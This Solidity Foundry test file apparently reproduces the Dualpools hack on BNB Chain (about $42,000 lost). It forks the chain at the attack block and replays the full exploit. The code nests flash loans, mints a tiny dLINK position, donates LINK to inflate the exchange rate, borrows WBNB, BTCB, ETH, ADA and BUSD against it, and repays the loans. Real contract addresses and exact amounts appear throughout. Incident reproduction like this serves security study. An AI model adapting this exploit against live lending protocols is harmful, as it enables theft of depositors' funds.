import "forge-std/Test.sol";

import "./../interface.sol";

// @KeyInfo - Total Lost : ~$42000 USD
// Attacker : https://bscscan.com/address/0x4645863205b47a0a3344684489e8c446a437d66c
// Attack Contract : https://bscscan.com/address/0x38721b0d67dfdba1411bb277d95af3d53fa7200e
// Vulnerable Contract : https://bscscan.com/address/0x5e5e28029ef37fc97ffb763c4ac1f532bbd4c7a2                
// Attack Tx : https://bscscan.com/tx/0x90f374ca33fbd5aaa0d01f5fcf5dee4c7af49a98dc56b47459d8b7ad52ef1e93

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x5e5e28029ef37fc97ffb763c4ac1f532bbd4c7a2#code
                          
// @Analysis
// https://lunaray.medium.com/dualpools-hack-analysis-5209233801fa

interface IMarketFacet {
    function isComptroller() external pure returns (bool);

    function liquidateCalculateSeizeTokens(
        address vTokenBorrowed,
        address vTokenCollateral,
        uint256 actualRepayAmount
    ) external view returns (uint256, uint256);

    function liquidateVAICalculateSeizeTokens(
        address vTokenCollateral,
        uint256 actualRepayAmount
    ) external view returns (uint256, uint256);

    // function checkMembership(address account, VToken vToken) external view returns (bool);

    function enterMarkets(address[] calldata vTokens) external returns (uint256[] memory);

    function exitMarket(address vToken) external returns (uint256);

    // function _supportMarket(VToken vToken) external returns (uint256);

    // function getAssetsIn(address account) external view returns (VToken[] memory);

    // function getAllMarkets() external view returns (VToken[] memory);

    function updateDelegate(address delegate, bool allowBorrows) external;
}

interface VBep20Interface {

    function transfer(address dst, uint amount) external returns (bool);

    function approve(address spender, uint amount) external returns (bool);

    function balanceOf(address owner) external view returns (uint);

    /*** User Interface ***/

    function mint(uint mintAmount) external returns (uint);

    function mint() external payable;

    function mintBehalf(address receiver, uint mintAmount) external returns (uint);

    function redeem(uint redeemTokens) external returns (uint);

    function redeemUnderlying(uint redeemAmount) external returns (uint);

    function borrow(uint borrowAmount) external returns (uint);

    function repayBorrow(uint repayAmount) external returns (uint);

    function repayBorrowBehalf(address borrower, uint repayAmount) external returns (uint);

    // function liquidateBorrow(
    //     address borrower,
    //     uint repayAmount,
    //     VTokenInterface vTokenCollateral
    // ) external returns (uint);

    /*** Admin Functions ***/

    function _addReserves(uint addAmount) external returns (uint);
}

contract ContractTest is Test {
    WETH9 private WBNB = WETH9(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private LINK = IERC20(0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD);
    IERC20 private BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IERC20 private ETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    IERC20 private ADA = IERC20(0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47);

    VBep20Interface private vLINK = VBep20Interface(0x650b940a1033B8A1b1873f78730FcFC73ec11f1f);
    VBep20Interface private vBUSD = VBep20Interface(0xfD5840Cd36d94D7229439859C0112a4185BC0255);
    VBep20Interface private vWBNB = VBep20Interface(0xA07c5b74C9B40447a954e1466938b865b6BBea36);

    VBep20Interface private dLINK = VBep20Interface(0x8fBCC81E5983d8347495468122c65E2Dc274eed9);
    VBep20Interface private dBTCB = VBep20Interface(0xB51F589BD9f69a0089c315521EE2FC848bAB6C0c);
    VBep20Interface private dWBNB = VBep20Interface(0xB5aAaCcFd69EA45b1A5Aa7E9c7a5e0DB2ce4357e);
    VBep20Interface private dETH = VBep20Interface(0x5F4a5252880b393a8cc4c01bBA4486Cf7a76075A);
    VBep20Interface private dADA = VBep20Interface(0xb2cf43E119BFC41554c4445f1867dc9F4cf69deD);
    VBep20Interface private dBUSD = VBep20Interface(0x514e2A29e98D49C676c93c5805cb83891CE6a9F5);

    IMarketFacet VenusProtocol = IMarketFacet(0xfD36E2c2a6789Db23113685031d7F16329158384);
    IMarketFacet Dualpools = IMarketFacet(0x5E5e28029eF37fC97ffb763C4aC1F532bbD4C7A2);

    IDPPOracle DPPOracle_0x1b52 = IDPPOracle(0x1B525b095b7353c5854Dbf6B0BE5Aa10F3818FaC);
    IDPPOracle DPPOracle_0x8191 = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);

    IPancakePair pancakeSwap = IPancakePair(0x824eb9faDFb377394430d2744fa7C42916DE3eCe); // LINK-WBNB
    Uni_Pair_V3 pool = Uni_Pair_V3(0x172fcD41E0913e95784454622d1c3724f546f849);


    function setUp() public {
        vm.createSelectFork("bsc", 36145772-1);
        vm.label(address(this), "AttackContract");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(LINK), "LINK");
        vm.label(address(BUSD), "BUSD");
        vm.label(address(BTCB), "BTCB");
        vm.label(address(ETH), "ETH");
        vm.label(address(ADA), "ADA");
        vm.label(address(vLINK), "vLINK");
        vm.label(address(vBUSD), "vBUSD");
        vm.label(address(vWBNB), "vWBNB");
        vm.label(address(VenusProtocol), "VenusProtocol");

        vm.label(address(dLINK), "dLINK");
        vm.label(address(dBTCB), "dBTCB");
        vm.label(address(dWBNB), "dWBNB");
        vm.label(address(dETH), "dETH");
        vm.label(address(dADA), "dADA");
        vm.label(address(dBUSD), "dBUSD");

        vm.label(address(Dualpools), "Dualpools");
    }

    function approveAll() internal {
        BUSD.approve(address(vBUSD), type(uint256).max);
        LINK.approve(address(vLINK), type(uint256).max);
        LINK.approve(address(dLINK), type(uint256).max);
    }

    function testAttack() public {
        approveAll();
        DPPOracle_0x1b52.flashLoan(7001000000000000000, 0, address(this), new bytes(1)); // borrow BUSD

    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        console.log(msg.sender);
        if(msg.sender == address(DPPOracle_0x1b52)){
            pancakeSwap.swap(0, 1000, address(this), data); // pancakeCall , swap BUSD to LINK
            BUSD.transfer(address(DPPOracle_0x1b52), 7001000000000000000);
        }else if(msg.sender == address(DPPOracle_0x8191)) {
            pool.flash(address(this), 70000000000000000000000, 0, new bytes(1)); // v3call , borrow BUSD
            WBNB.transfer(address(pancakeSwap), 59);
        }
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        DPPOracle_0x8191.flashLoan(312497349377117598837, 154451704908346387787280, address(this), data); // borrow WBNB and BUSD
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        
        address[] memory tokenList = new address[](2);
        tokenList[0] = address(vBUSD);
        tokenList[1] = address(vWBNB);
        VenusProtocol.enterMarkets(tokenList);
        vBUSD.mint(224451704908346387787280); // 969266514517797 vBUSD
        WBNB.withdraw(312497349377117598837);
        vWBNB.mint{value: 312497349377117598837 wei}(); // 1320879335222 vBNB
        vLINK.borrow(11500000000000000000000);

        dLINK.mint(2);
        LINK.transfer(address(dLINK), 11499999999999999999998);
        address[] memory tokenList1 = new address[](1);
        tokenList1[0] = address(dLINK);
        Dualpools.enterMarkets(tokenList1);
        dWBNB.borrow(50074555376020317788);
        dBTCB.borrow(171600491170058684);
        dETH.borrow(3992080357935675366);
        dADA.borrow(6378808489713884698357);
        dBUSD.borrow(911577468904829524350);
        dLINK.redeemUnderlying(11499999999999999999898);

        // LINK.transfer(address(this), 1000); // not necessary

        vLINK.repayBorrow(11500000000000000000000);
        vBUSD.redeem(969266514517797);
        vWBNB.redeem(1320879335222);

        // BUSD.transfer(address(this), 7001000000000000000); // not necessary
        BUSD.transfer(address(DPPOracle_0x8191), 154451704908346387787280);
        BUSD.transfer(address(pool), 70007000000000000000000);

        WBNB.deposit{value: 362571904345528150166}();
        WBNB.transfer(address(DPPOracle_0x8191), 312497349377117598837);
    }


    receive() external payable {}
    fallback() external payable {}
}
